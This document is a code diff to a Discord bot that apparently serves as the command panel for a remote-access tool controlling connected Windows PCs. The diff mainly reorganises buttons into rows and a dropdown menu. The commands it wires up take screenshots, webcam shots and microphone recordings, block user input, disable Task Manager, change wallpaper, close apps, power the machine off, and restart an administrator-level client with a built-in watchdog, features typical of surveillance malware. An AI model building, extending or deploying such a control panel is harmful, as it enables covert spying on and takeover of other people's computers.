@@ -196,6 +196,7 @@ class SessionSelect(discord.ui.Select):
             options=session_options(),
             min_values=1,
             max_values=1,
+            row=0,
         )
 
     async def callback(self, interaction: discord.Interaction) -> None:
@@ -226,8 +227,9 @@ class SimpleCommandButton(discord.ui.Button):
         timeout: float = 15.0,
         ok_text: str | None = None,
         payload_extra: dict[str, Any] | None = None,
+        row: int | None = None,
     ) -> None:
-        super().__init__(label=label, style=style, custom_id=custom_id)
+        super().__init__(label=label, style=style, custom_id=custom_id, row=row)
         self.command = command
         self.timeout = timeout
         self.ok_text = ok_text or f"{label}: ок"
@@ -254,11 +256,12 @@ class SimpleCommandButton(discord.ui.Button):
 
 
 class StatusButton(discord.ui.Button):
-    def __init__(self) -> None:
+    def __init__(self, *, row: int | None = None) -> None:
         super().__init__(
             label="Статус",
             style=discord.ButtonStyle.secondary,
             custom_id="status_button",
+            row=row,
         )
 
     async def callback(self, interaction: discord.Interaction) -> None:
@@ -593,6 +596,7 @@ class RecordSelect(discord.ui.Select):
             ],
             min_values=1,
             max_values=1,
+            row=1,
         )
 
     async def callback(self, interaction: discord.Interaction) -> None:
@@ -611,8 +615,9 @@ class ModalButton(discord.ui.Button):
         custom_id: str,
         modal_factory,
         style: discord.ButtonStyle = discord.ButtonStyle.secondary,
+        row: int | None = None,
     ) -> None:
-        super().__init__(label=label, style=style, custom_id=custom_id)
+        super().__init__(label=label, style=style, custom_id=custom_id, row=row)
         self.modal_factory = modal_factory
 
     async def callback(self, interaction: discord.Interaction) -> None:
@@ -623,11 +628,12 @@ class ModalButton(discord.ui.Button):
 
 
 class WallpaperButton(discord.ui.Button):
-    def __init__(self) -> None:
+    def __init__(self, *, row: int | None = None) -> None:
         super().__init__(
             label="Обои",
             style=discord.ButtonStyle.secondary,
             custom_id="wallpaper_button",
+            row=row,
         )
 
     async def callback(self, interaction: discord.Interaction) -> None:
@@ -647,6 +653,109 @@ class WallpaperButton(discord.ui.Button):
         )
 
 
+async def clear_chat(interaction: discord.Interaction) -> None:
+    if interaction.channel_id != CHANNEL_ID:
+        await interaction.response.send_message(
+            "Очистка только в канале с панелью.",
+            ephemeral=True,
+        )
+        return
+
+    await interaction.response.defer(ephemeral=True)
+    channel = interaction.channel
+    deleted = 0
+    skipped = 0
+
+    async for message in channel.history(limit=300):
+        if message.author.id != bot.user.id:
+            continue
+        if panel_message_id and message.id == panel_message_id:
+            skipped += 1
+            continue
+        if message.pinned:
+            skipped += 1
+            continue
+        if message.components:
+            skipped += 1
+            continue
+        try:
+            await message.delete()
+            deleted += 1
+            await asyncio.sleep(0.35)
+        except discord.HTTPException:
+            skipped += 1
+
+    await interaction.followup.send(
+        f"Удалено сообщений бота: **{deleted}**. Панель и закреплённые — сохранены.",
+        ephemeral=True,
+    )
+
+
+class ExtraSelect(discord.ui.Select):
+    def __init__(self) -> None:
+        super().__init__(
+            placeholder="Ещё: закрыть, питание, очистка…",
+            custom_id="extra_select",
+            options=[
+                discord.SelectOption(label="Закрыть", value="close"),
+                discord.SelectOption(label="Приложения", value="apps"),
+                discord.SelectOption(label="Блок ввода", value="block"),
+                discord.SelectOption(label="Диспетчер", value="taskmgr"),
+                discord.SelectOption(label="Перезагрузка ПК", value="restart"),
+                discord.SelectOption(label="Выключить ПК", value="shutdown"),
+                discord.SelectOption(label="Перезапуск client", value="restart_client"),
+                discord.SelectOption(label="Очистить чат", value="clear_chat"),
+            ],
+            min_values=1,
+            max_values=1,
+            row=4,
+        )
+
+    async def callback(self, interaction: discord.Interaction) -> None:
+        session = await require_session(interaction)
+        if session is None:
+            return
+
+        action = self.values[0]
+        if action == "close":
+            await interaction.response.send_modal(CloseModal(session))
+            return
+        if action == "restart":
+            await interaction.response.send_modal(
+                ConfirmPowerModal(session, "restart", "Перезагрузка ПК")
+            )
+            return
+        if action == "shutdown":
+            await interaction.response.send_modal(
+                ConfirmPowerModal(session, "shutdown", "Выключение ПК")
+            )
+            return
+        if action == "clear_chat":
+            await clear_chat(interaction)
+            return
+
+        commands = {
+            "apps": ("list_apps", 15.0, "Активные окна"),
+            "block": ("toggle_input_block", 15.0, "Блокировка ввода"),
+            "taskmgr": ("toggle_taskmgr", 15.0, "Диспетчер задач"),
+            "restart_client": ("restart_client", 10.0, "Client перезапущен"),
+        }
+        command, timeout, ok_text = commands[action]
+        await interaction.response.defer(ephemeral=True)
+        result = await request_session(
+            session,
+            {"type": command},
+            timeout=timeout,
+        )
+        await send_command_result(
+            interaction,
+            session,
+            result,
+            ok_text=f"{ok_text} (**{session['name']}**)",
+            fail_prefix=action,
+        )
+
+
 class ControlPanel(discord.ui.View):
     def __init__(self) -> None:
         super().__init__(timeout=None)
@@ -661,14 +770,16 @@ class ControlPanel(discord.ui.View):
                 style=discord.ButtonStyle.primary,
                 timeout=5.0,
                 ok_text="pong",
+                row=2,
             )
         )
-        self.add_item(StatusButton())
+        self.add_item(StatusButton(row=2))
         self.add_item(
             ModalButton(
                 label="Уведомление",
                 custom_id="notify_button",
                 modal_factory=NotifyModal,
+                row=2,
             )
         )
         self.add_item(
@@ -676,6 +787,7 @@ class ControlPanel(discord.ui.View):
                 label="Вставка",
                 custom_id="paste_button",
                 modal_factory=PasteModal,
+                row=2,
             )
         )
         self.add_item(
@@ -685,6 +797,7 @@ class ControlPanel(discord.ui.View):
                 command="screenshot",
                 timeout=20.0,
                 ok_text="Скриншот",
+                row=2,
             )
         )
         self.add_item(
@@ -694,15 +807,16 @@ class ControlPanel(discord.ui.View):
                 command="webcam",
                 timeout=25.0,
                 ok_text="Камера",
+                row=3,
             )
         )
-
         self.add_item(
             SimpleCommandButton(
                 label="Рабочий стол",
                 custom_id="desktop_button",
                 command="show_desktop",
                 ok_text="Свёрнуто на рабочий стол (Win+D)",
+                row=3,
             )
         )
         self.add_item(
@@ -710,126 +824,19 @@ class ControlPanel(discord.ui.View):
                 label="На экран",
                 custom_id="fullscreen_button",
                 modal_factory=FullscreenModal,
+                row=3,
             )
         )
-        self.add_item(WallpaperButton())
+        self.add_item(WallpaperButton(row=3))
         self.add_item(
             ModalButton(
                 label="Открыть",
                 custom_id="open_button",
                 modal_factory=OpenModal,
+                row=3,
             )
         )
-        self.add_item(
-            ModalButton(
-                label="Закрыть",
-                custom_id="close_button",
-                modal_factory=CloseModal,
-            )
-        )
-
-        self.add_item(
-            SimpleCommandButton(
-                label="Приложения",
-                custom_id="apps_button",
-                command="list_apps",
-                timeout=15.0,
-                ok_text="Активные окна",
-            )
-        )
-        self.add_item(
-            SimpleCommandButton(
-                label="Блок ввода",
-                custom_id="block_mouse_button",
-                command="toggle_input_block",
-                style=discord.ButtonStyle.danger,
-                ok_text="Блокировка ввода",
-            )
-        )
-        self.add_item(
-            SimpleCommandButton(
-                label="Диспетчер",
-                custom_id="taskmgr_button",
-                command="toggle_taskmgr",
-                style=discord.ButtonStyle.danger,
-                ok_text="Диспетчер задач",
-            )
-        )
-        self.add_item(
-            ModalButton(
-                label="Перезагрузка",
-                custom_id="restart_button",
-                style=discord.ButtonStyle.danger,
-                modal_factory=lambda s: ConfirmPowerModal(
-                    s, "restart", "Перезагрузка ПК"
-                ),
-            )
-        )
-        self.add_item(
-            ModalButton(
-                label="Выключить",
-                custom_id="shutdown_button",
-                style=discord.ButtonStyle.danger,
-                modal_factory=lambda s: ConfirmPowerModal(
-                    s, "shutdown", "Выключение ПК"
-                ),
-            )
-        )
-        self.add_item(
-            SimpleCommandButton(
-                label="Перезапуск client",
-                custom_id="restart_client_button",
-                command="restart_client",
-                ok_text="Client перезапущен",
-            )
-        )
-        self.add_item(ClearChatButton())
-
-
-class ClearChatButton(discord.ui.Button):
-    def __init__(self) -> None:
-        super().__init__(
-            label="Очистить чат",
-            style=discord.ButtonStyle.secondary,
-            custom_id="clear_chat_button",
-        )
-
-    async def callback(self, interaction: discord.Interaction) -> None:
-        if interaction.channel_id != CHANNEL_ID:
-            await interaction.response.send_message(
-                "Очистка только в канале с панелью.",
-                ephemeral=True,
-            )
-            return
-
-        await interaction.response.defer(ephemeral=True)
-        channel = interaction.channel
-        deleted = 0
-        skipped = 0
-
-        async for message in channel.history(limit=300):
-            if message.author.id != bot.user.id:
-                continue
-            if panel_message_id and message.id == panel_message_id:
-                skipped += 1
-                continue
-            if message.pinned:
-                skipped += 1
-                continue
-            if message.components:
-                skipped += 1
-                continue
-            try:
-                await message.delete()
-                deleted += 1
-                await asyncio.sleep(0.35)
-            except discord.HTTPException:
-                skipped += 1
-
-        await interaction.followup.send(
-            f"Удалено сообщений бота: **{deleted}**. Панель и закреплённые — сохранены.",
-            ephemeral=True,
-        )
+        self.add_item(ExtraSelect())
 
 
 def panel_embed() -> discord.Embed:
@@ -851,10 +858,7 @@ def panel_embed() -> discord.Embed:
             "**Запись** — клип экрана (5–15 сек) или микрофон (1–30 сек).\n"
             "**На экран** — картинка на весь экран на N секунд (потом пришлите фото).\n"
             "**Обои** — поставить картинку обоями навсегда (потом пришлите фото).\n"
-            "**Блок ввода** — client от администратора; повторный клик снимает блок.\n"
-            "**Диспетчер** — запрет/разрешение диспетчера задач; повторный клик снимает.\n"
-            "**Перезапуск client** — перезапуск client (watchdog внутри exe).\n"
-            "**Очистить чат** — удаляет старые сообщения бота, панель не трогает.\n"
+            "**Ещё** — закрыть окно, приложения, блок ввода, питание, очистка чата.\n"
             "**Перезагрузка / Выключить** — подтверждение словом `ДА`.\n\n"
             f"**Онлайн:**\n{body}"
         ),
@@ -873,7 +877,12 @@ async def refresh_panel() -> None:
                 print(f"Не удалось получить канал: {exc}")
                 return
 
-        view = ControlPanel()
+        try:
+            view = ControlPanel()
+        except Exception as exc:
+            print(f"Не удалось собрать панель: {exc}")
+            return
+
         embed = panel_embed()
 
         if panel_message_id is None:
@@ -887,6 +896,12 @@ async def refresh_panel() -> None:
         except discord.NotFound:
             msg = await channel.send(embed=embed, view=view)
             panel_message_id = msg.id
+        except Exception as exc:
+            print(f"Не удалось обновить панель: {exc}")
+
+
+def schedule_refresh_panel() -> None:
+    asyncio.create_task(refresh_panel())
 
 
 @bot.event
@@ -1008,7 +1023,7 @@ async def ws_handler(request: web.Request) -> web.WebSocketResponse:
                 }
                 print(f"Сессия онлайн: {name} ({session_id})")
                 await ws.send_json({"type": "registered", "id": session_id, "name": name})
-                await refresh_panel()
+                schedule_refresh_panel()
                 continue
 
             if msg_type == "result" and session_id and session_id in sessions:
@@ -1031,7 +1046,7 @@ async def ws_handler(request: web.Request) -> web.WebSocketResponse:
                     user_selected_session.pop(uid, None)
             print(f"Сессия оффлайн: {name} ({session_id})")
             if not bot.is_closed():
-                await refresh_panel()
+                schedule_refresh_panel()
 
     return ws
 
